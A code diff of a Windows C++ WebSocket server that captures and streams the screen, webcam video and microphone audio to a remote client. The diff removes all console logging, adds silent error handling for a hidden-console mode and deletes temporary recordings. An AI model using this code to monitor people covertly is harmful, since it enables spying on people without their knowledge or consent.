@@ -9,32 +9,61 @@
 // Suppress ALL output including DLL warnings (system-level stderr redirect)
 class SuppressAllOutput {
 public:
-    SuppressAllOutput() {
-        // Save original stderr
-        old_stderr = _dup(_fileno(stderr));
-        old_stdout = _dup(_fileno(stdout));
-        
-        // Redirect stderr and stdout to NUL
-        FILE* null_file = nullptr;
-        freopen_s(&null_file, "NUL", "w", stderr);
-        freopen_s(&null_file, "NUL", "w", stdout);
+    SuppressAllOutput() : old_stderr(-1), old_stdout(-1), redirected(false) {
+        // Check if stderr and stdout are valid before attempting to redirect
+        // When SHOW_CONSOLE = false, these may not be initialized
+        try {
+            if (stderr && stdout) {
+                int stderr_fd = _fileno(stderr);
+                int stdout_fd = _fileno(stdout);
+                
+                // Only proceed if file descriptors are valid
+                if (stderr_fd >= 0 && stdout_fd >= 0) {
+                    // Save original stderr and stdout
+                    old_stderr = _dup(stderr_fd);
+                    old_stdout = _dup(stdout_fd);
+                    
+                    // Redirect stderr and stdout to NUL
+                    FILE* null_file = nullptr;
+                    freopen_s(&null_file, "NUL", "w", stderr);
+                    freopen_s(&null_file, "NUL", "w", stdout);
+                    
+                    redirected = true;
+                }
+            }
+        }
+        catch (...) {
+            // Silently fail - no console available
+            redirected = false;
+        }
     }
     
     ~SuppressAllOutput() {
-        // Restore stderr and stdout
-        _dup2(old_stderr, _fileno(stderr));
-        _dup2(old_stdout, _fileno(stdout));
-        _close(old_stderr);
-        _close(old_stdout);
-        
-        // Re-sync C++ streams
-        std::ios::sync_with_stdio(false);
-        std::ios::sync_with_stdio(true);
+        // Only restore if we successfully redirected
+        if (redirected && old_stderr >= 0 && old_stdout >= 0) {
+            try {
+                // Restore stderr and stdout
+                if (stderr && stdout) {
+                    _dup2(old_stderr, _fileno(stderr));
+                    _dup2(old_stdout, _fileno(stdout));
+                }
+                _close(old_stderr);
+                _close(old_stdout);
+                
+                // Re-sync C++ streams
+                std::ios::sync_with_stdio(false);
+                std::ios::sync_with_stdio(true);
+            }
+            catch (...) {
+                // Silently fail
+            }
+        }
     }
     
 private:
     int old_stderr;
     int old_stdout;
+    bool redirected;
 };
 
 // Quét tất cả camera có sẵn trên hệ thống - Simple version without DirectShow
@@ -66,10 +95,8 @@ std::string ScanAvailableCameras() {
             }
         }
     } catch (...) {
-        std::cout << "[Camera] Scan error" << std::endl;
     }
     
-    std::cout << "[Camera] Found " << cameraList.size() << " camera(s)" << std::endl;
     return cameraList.dump();
 }
 
@@ -79,7 +106,6 @@ std::string ScanAvailableMicrophones() {
     
     try {
         UINT numDevices = waveInGetNumDevs();
-        std::cout << "[Mic] Found " << numDevices << " input device(s)" << std::endl;
         
         for (UINT i = 0; i < numDevices && i < 10; i++) {
             WAVEINCAPSW caps;  // Use wide version
@@ -98,7 +124,6 @@ std::string ScanAvailableMicrophones() {
             }
         }
     } catch (...) {
-        std::cout << "[Mic] Scan error" << std::endl;
     }
     
     return micList.dump();
@@ -136,7 +161,6 @@ std::string CaptureScreenBase64(int monitorIndex) {
         width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
         height = GetSystemMetrics(SM_CYVIRTUALSCREEN);
         found = true;
-        std::cout << "[Screenshot] Capturing all monitors: " << width << "x" << height << std::endl;
     } else {
         // Chụp một màn hình cụ thể
         DISPLAY_DEVICE dd;
@@ -155,9 +179,6 @@ std::string CaptureScreenBase64(int monitorIndex) {
                     width = dm.dmPelsWidth;
                     height = dm.dmPelsHeight;
                     found = true;
-                    std::cout << "[Screenshot] Capturing monitor " << monitorIndex 
-                              << " at (" << x1 << "," << y1 << ") "
-                              << width << "x" << height << std::endl;
                     break;
                 }
             }
@@ -166,7 +187,6 @@ std::string CaptureScreenBase64(int monitorIndex) {
         
         // Fallback nếu không tìm thấy monitor
         if (!found) {
-            std::cout << "[Screenshot] Monitor " << monitorIndex << " not found, using primary monitor" << std::endl;
             x1 = 0;
             y1 = 0;
             width = GetSystemMetrics(SM_CXSCREEN);
@@ -251,11 +271,9 @@ void WebcamThreadFunc(server* s, websocketpp::connection_hdl hdl, int cameraInde
             // If multiple failures, slow down frame rate to reduce network pressure
             if (sendFailCount > 3) {
                 adaptiveDelay = std::min(200, adaptiveDelay + 20); // Max 5 FPS on poor network
-                std::cout << "[Stream] Network congestion detected, reducing FPS (delay: " << adaptiveDelay << "ms)" << std::endl;
             }
             
             if (sendFailCount > 10) {
-                std::cout << "[Stream] Too many send failures, stopping stream" << std::endl;
                 g_IsStreaming = false;
             }
         }
@@ -267,98 +285,165 @@ void WebcamThreadFunc(server* s, websocketpp::connection_hdl hdl, int cameraInde
 
 // Record Video with custom duration
 void RecordVideoThread(server* s, websocketpp::connection_hdl hdl, int duration, int cameraIndex) {
-    cv::VideoCapture cap(cameraIndex, cv::CAP_DSHOW);
-    if (!cap.isOpened()) return;
-
-    int width = 640;
-    int height = 480;
-    cap.set(cv::CAP_PROP_FRAME_WIDTH, width);
-    cap.set(cv::CAP_PROP_FRAME_HEIGHT, height);
-    
-    // Send CAM_READY notification when camera is ready
+    // Wrap entire function in try-catch to prevent crashes when no console
     try {
-        json j_ready;
-        j_ready["type"] = "CAM_READY";
-        s->send(hdl, j_ready.dump(), websocketpp::frame::opcode::text);
-    }
-    catch (...) {}
+        cv::VideoCapture cap;
+        
+        // Suppress output during camera opening
+        {
+            SuppressAllOutput suppressAll;
+            cap.open(cameraIndex, cv::CAP_DSHOW);
+        }
+        
+        if (!cap.isOpened()) {
+            // Send error notification
+            try {
+                json j_error;
+                j_error["type"] = "CAM_ERROR";
+                j_error["msg"] = "Failed to open camera";
+                s->send(hdl, j_error.dump(), websocketpp::frame::opcode::text);
+            }
+            catch (...) {}
+            return;
+        }
 
-    std::string filename = "server_rec_temp.mp4";
-    cv::VideoWriter writer;
-    std::string codecUsed = "unknown";
-    
-    // Suppress ALL output including DLL warnings during codec detection
-    {
-        SuppressAllOutput suppressAll;
+        int width = 640;
+        int height = 480;
+        cap.set(cv::CAP_PROP_FRAME_WIDTH, width);
+        cap.set(cv::CAP_PROP_FRAME_HEIGHT, height);
         
-        // Priority 1: Try avc1 first (most compatible, no warnings)
-        writer.open(filename, cv::VideoWriter::fourcc('a', 'v', 'c', '1'), 20.0, cv::Size(width, height), true);
-        if (writer.isOpened()) {
-            codecUsed = "H.264 (AVC1)";
-        }
-        
-        // Priority 2: Try H264
-        if (!writer.isOpened()) {
-            writer.open(filename, cv::VideoWriter::fourcc('H', '2', '6', '4'), 20.0, cv::Size(width, height), true);
-            if (writer.isOpened()) {
-                codecUsed = "H.264";
-            }
-        }
-        
-        // Priority 3: Try h264 (lowercase)
-        if (!writer.isOpened()) {
-            writer.open(filename, cv::VideoWriter::fourcc('h', '2', '6', '4'), 20.0, cv::Size(width, height), true);
-            if (writer.isOpened()) {
-                codecUsed = "H.264 (h264)";
-            }
-        }
-        
-        // Priority 4: Try X264 (may show warnings but works)
-        if (!writer.isOpened()) {
-            writer.open(filename, cv::VideoWriter::fourcc('X', '2', '6', '4'), 20.0, cv::Size(width, height), true);
-            if (writer.isOpened()) {
-                codecUsed = "H.264 (X264)";
-            }
-        }
-        
-        // Fallback: Use MJPEG in AVI container
-        if (!writer.isOpened()) {
-            filename = "server_rec_temp.avi";
-            writer.open(filename, cv::VideoWriter::fourcc('M', 'J', 'P', 'G'), 20.0, cv::Size(width, height), true);
-            if (writer.isOpened()) {
-                codecUsed = "MJPEG (AVI)";
-            }
-        }
-    } // Destructor restores stderr/stdout - warnings completely hidden
-    
-    if (!writer.isOpened()) {
-        std::cout << "[Record] ❌ No codec available!" << std::endl;
-        cap.release();
-        return;
-    }
-    
-    // Only print final codec used - clean and simple
-    std::cout << "[Record] ✅ " << codecUsed << " | " << width << "x" << height << " @ 20fps" << std::endl;
-
-    cv::Mat frame;
-    int totalFrames = duration * 20; // 20 FPS
-    for (int i = 0; i < totalFrames; i++) {
-        cap >> frame;
-        if (frame.empty()) break;
-        writer.write(frame);
-        std::this_thread::sleep_for(std::chrono::milliseconds(50));
-    }
-    writer.release();
-    cap.release();
-
-    std::vector<unsigned char> fileData = ReadFileToBuffer(filename);
-    if (!fileData.empty()) {
-        std::string b64 = Base64Encode(fileData.data(), (unsigned int)fileData.size());
-        json j;
-        j["type"] = "RECORD_RESULT";
-        j["data"] = b64;
+        // Send CAM_READY notification when camera is ready
         try {
-            s->send(hdl, j.dump(), websocketpp::frame::opcode::text);
+            json j_ready;
+            j_ready["type"] = "CAM_READY";
+            s->send(hdl, j_ready.dump(), websocketpp::frame::opcode::text);
+        }
+        catch (...) {}
+
+        std::string filename = "server_rec_temp.mp4";
+        cv::VideoWriter writer;
+        std::string codecUsed = "unknown";
+        bool writerOpened = false;
+        
+        // Suppress ALL output including DLL warnings during codec detection
+        {
+            SuppressAllOutput suppressAll;
+            
+            // Priority 1: Try avc1 first (most compatible, no warnings)
+            try {
+                writer.open(filename, cv::VideoWriter::fourcc('a', 'v', 'c', '1'), 20.0, cv::Size(width, height), true);
+                if (writer.isOpened()) {
+                    codecUsed = "H.264 (AVC1)";
+                    writerOpened = true;
+                }
+            } catch (...) {}
+            
+            // Priority 2: Try H264
+            if (!writerOpened) {
+                try {
+                    writer.open(filename, cv::VideoWriter::fourcc('H', '2', '6', '4'), 20.0, cv::Size(width, height), true);
+                    if (writer.isOpened()) {
+                        codecUsed = "H.264";
+                        writerOpened = true;
+                    }
+                } catch (...) {}
+            }
+            
+            // Priority 3: Try h264 (lowercase)
+            if (!writerOpened) {
+                try {
+                    writer.open(filename, cv::VideoWriter::fourcc('h', '2', '6', '4'), 20.0, cv::Size(width, height), true);
+                    if (writer.isOpened()) {
+                        codecUsed = "H.264 (h264)";
+                        writerOpened = true;
+                    }
+                } catch (...) {}
+            }
+            
+            // Priority 4: Try X264 (may show warnings but works)
+            if (!writerOpened) {
+                try {
+                    writer.open(filename, cv::VideoWriter::fourcc('X', '2', '6', '4'), 20.0, cv::Size(width, height), true);
+                    if (writer.isOpened()) {
+                        codecUsed = "H.264 (X264)";
+                        writerOpened = true;
+                    }
+                } catch (...) {}
+            }
+            
+            // Fallback: Use MJPEG in AVI container
+            if (!writerOpened) {
+                try {
+                    filename = "server_rec_temp.avi";
+                    writer.open(filename, cv::VideoWriter::fourcc('M', 'J', 'P', 'G'), 20.0, cv::Size(width, height), true);
+                    if (writer.isOpened()) {
+                        codecUsed = "MJPEG (AVI)";
+                        writerOpened = true;
+                    }
+                } catch (...) {}
+            }
+        } // Destructor restores stderr/stdout - warnings completely hidden
+        
+        if (!writerOpened || !writer.isOpened()) {
+            cap.release();
+            // Send error notification
+            try {
+                json j_error;
+                j_error["type"] = "CAM_ERROR";
+                j_error["msg"] = "Failed to initialize video writer";
+                s->send(hdl, j_error.dump(), websocketpp::frame::opcode::text);
+            }
+            catch (...) {}
+            return;
+        }
+
+        cv::Mat frame;
+        int totalFrames = duration * 20; // 20 FPS
+        for (int i = 0; i < totalFrames; i++) {
+            try {
+                cap >> frame;
+                if (frame.empty()) break;
+                writer.write(frame);
+            } catch (...) {
+                // Ignore frame errors and continue
+            }
+            std::this_thread::sleep_for(std::chrono::milliseconds(50));
+        }
+        
+        // Release resources safely
+        try {
+            writer.release();
+        } catch (...) {}
+        
+        try {
+            cap.release();
+        } catch (...) {}
+
+        // Read and send file
+        std::vector<unsigned char> fileData = ReadFileToBuffer(filename);
+        if (!fileData.empty()) {
+            std::string b64 = Base64Encode(fileData.data(), (unsigned int)fileData.size());
+            json j;
+            j["type"] = "RECORD_RESULT";
+            j["data"] = b64;
+            try {
+                s->send(hdl, j.dump(), websocketpp::frame::opcode::text);
+            }
+            catch (...) {}
+        }
+        
+        // Clean up temp file
+        try {
+            DeleteFileA(filename.c_str());
+        } catch (...) {}
+        
+    } catch (...) {
+        // Catch all exceptions to prevent crashes
+        try {
+            json j_error;
+            j_error["type"] = "CAM_ERROR";
+            j_error["msg"] = "Unexpected error during recording";
+            s->send(hdl, j_error.dump(), websocketpp::frame::opcode::text);
         }
         catch (...) {}
     }
@@ -518,7 +603,6 @@ void LiveAudioThread(server* s, websocketpp::connection_hdl hdl, int micIndex) {
     
     MMRESULT result = waveInOpen(&hWaveIn, deviceId, &wfx, 0, 0, CALLBACK_NULL);
     if (result != MMSYSERR_NOERROR) {
-        std::cout << "[Audio] Failed to open mic, error: " << result << std::endl;
         try {
             json j;
             j["type"] = "ACTION_RESULT";
@@ -545,18 +629,15 @@ void LiveAudioThread(server* s, websocketpp::connection_hdl hdl, int micIndex) {
         
         result = waveInPrepareHeader(hWaveIn, &waveHdrs[i], sizeof(WAVEHDR));
         if (result != MMSYSERR_NOERROR) {
-            std::cout << "[Audio] Failed to prepare header " << i << ", error: " << result << std::endl;
         }
         
         result = waveInAddBuffer(hWaveIn, &waveHdrs[i], sizeof(WAVEHDR));
         if (result != MMSYSERR_NOERROR) {
-            std::cout << "[Audio] Failed to add buffer " << i << ", error: " << result << std::endl;
         }
     }
     
     result = waveInStart(hWaveIn);
     if (result != MMSYSERR_NOERROR) {
-        std::cout << "[Audio] Failed to start recording, error: " << result << std::endl;
         for (int i = 0; i < NUM_BUFFERS; i++) {
             waveInUnprepareHeader(hWaveIn, &waveHdrs[i], sizeof(WAVEHDR));
             delete[] buffers[i];
@@ -565,10 +646,6 @@ void LiveAudioThread(server* s, websocketpp::connection_hdl hdl, int micIndex) {
         g_IsStreamingAudio = false;
         return;
     }
-    
-    std::cout << "[Audio] Started live streaming from mic " << micIndex << std::endl;
-    std::cout << "[Audio] Format: " << SAMPLE_RATE << "Hz, " << CHANNELS << "ch, " << BITS_PER_SAMPLE << "bit" << std::endl;
-    std::cout << "[Audio] Buffer size: " << BUFFER_SIZE << " bytes (" << CHUNK_DURATION_MS << "ms chunks)" << std::endl;
     
     // Send start notification
     try {
@@ -592,7 +669,6 @@ void LiveAudioThread(server* s, websocketpp::connection_hdl hdl, int micIndex) {
             
             // Timeout after 500ms
             if (waitMs >= 500) {
-                std::cout << "[Audio] Buffer " << currentBuffer << " timeout" << std::endl;
                 break;
             }
         }
@@ -620,14 +696,11 @@ void LiveAudioThread(server* s, websocketpp::connection_hdl hdl, int micIndex) {
                     
                     chunkCount++;
                     if (chunkCount % 5 == 0) {
-                        std::cout << "[Audio] Sent " << chunkCount << " chunks" << std::endl;
                     }
                 } catch (const std::exception& e) {
-                    std::cout << "[Audio] Send error: " << e.what() << std::endl;
                     g_IsStreamingAudio = false;
                     break;
                 } catch (...) {
-                    std::cout << "[Audio] Unknown send error" << std::endl;
                     g_IsStreamingAudio = false;
                     break;
                 }
@@ -640,7 +713,6 @@ void LiveAudioThread(server* s, websocketpp::connection_hdl hdl, int micIndex) {
             
             result = waveInAddBuffer(hWaveIn, &waveHdrs[currentBuffer], sizeof(WAVEHDR));
             if (result != MMSYSERR_NOERROR) {
-                std::cout << "[Audio] Failed to requeue buffer " << currentBuffer << ", error: " << result << std::endl;
                 // Try to recover by resetting and re-adding all buffers
                 waveInReset(hWaveIn);
                 for (int i = 0; i < NUM_BUFFERS; i++) {
@@ -656,8 +728,6 @@ void LiveAudioThread(server* s, websocketpp::connection_hdl hdl, int micIndex) {
         currentBuffer = (currentBuffer + 1) % NUM_BUFFERS;
     }
     
-    std::cout << "[Audio] Stopping stream, sent " << chunkCount << " chunks total" << std::endl;
-    
     waveInStop(hWaveIn);
     waveInReset(hWaveIn);
     
@@ -667,8 +737,6 @@ void LiveAudioThread(server* s, websocketpp::connection_hdl hdl, int micIndex) {
     }
     
     waveInClose(hWaveIn);
-    
-    std::cout << "[Audio] Stream closed" << std::endl;
 }
 
 void StartMicStream(server* s, websocketpp::connection_hdl hdl, int micIndex) {
@@ -724,10 +792,7 @@ std::string ScanAvailableMonitors() {
             }
         }
     } catch (...) {
-        std::cout << "[Monitor] Scan error" << std::endl;
     }
-    
-    std::cout << "[Monitor] Found " << monitorList.size() << " monitor(s)" << std::endl;
     return monitorList.dump();
 }
 
@@ -775,8 +840,6 @@ void ScreenStreamThreadFunc(server* s, websocketpp::connection_hdl hdl, int moni
             height = GetSystemMetrics(SM_CYVIRTUALSCREEN);
         }
     }
-    
-    std::cout << "[Screen] Streaming monitor " << monitorIndex << " (" << width << "x" << height << ")" << std::endl;
     
     // Prepare GDI+ for screen capture
     HDC hdcScreen = GetDC(NULL);
@@ -829,10 +892,6 @@ void ScreenStreamThreadFunc(server* s, websocketpp::connection_hdl hdl, int moni
             }
         }
         
-        std::cout << "[Screen] Original: " << width << "x" << height 
-                  << ", Streaming: " << targetWidth << "x" << targetHeight 
-                  << " (ratio: " << aspectRatio << ")" << std::endl;
-        
         // Create downscaled bitmap
         Bitmap scaledBitmap(targetWidth, targetHeight, PixelFormat24bppRGB);
         Graphics graphics(&scaledBitmap);
@@ -867,7 +926,6 @@ void ScreenStreamThreadFunc(server* s, websocketpp::connection_hdl hdl, int moni
             // Quá chậm (mạng yếu/CPU chậm) → giảm quality và tăng delay (giảm FPS)
             if (currentQuality > 40) currentQuality -= 10;
             if (targetDelay < 200) targetDelay += 10; // Tăng delay = giảm FPS
-            std::cout << "[Screen] Slow (" << encodeDuration << "ms), reducing quality to " << currentQuality << "%, delay to " << targetDelay << "ms" << std::endl;
         } else if (encodeDuration < 40) {
             // Nhanh (mạng mạnh) → tăng quality và giảm delay (tăng FPS)
             if (currentQuality < 100) {
@@ -912,7 +970,6 @@ void ScreenStreamThreadFunc(server* s, websocketpp::connection_hdl hdl, int moni
             
             frameCount++;
             if (frameCount % 100 == 0) {
-                std::cout << "[Screen] Sent " << frameCount << " frames, quality: " << currentQuality << "%, actual FPS: " << (int)actualFPS << ", delay: " << targetDelay << "ms, size: " << (size/1024) << "KB" << std::endl;
             }
         }
         catch (...) {
@@ -929,8 +986,6 @@ void ScreenStreamThreadFunc(server* s, websocketpp::connection_hdl hdl, int moni
     DeleteObject(hBitmap);
     DeleteDC(hdcMem);
     ReleaseDC(NULL, hdcScreen);
-    
-    std::cout << "[Screen] Streaming stopped" << std::endl;
 }
 
 void StartScreenStream(server* s, websocketpp::connection_hdl hdl, int monitorIndex) {
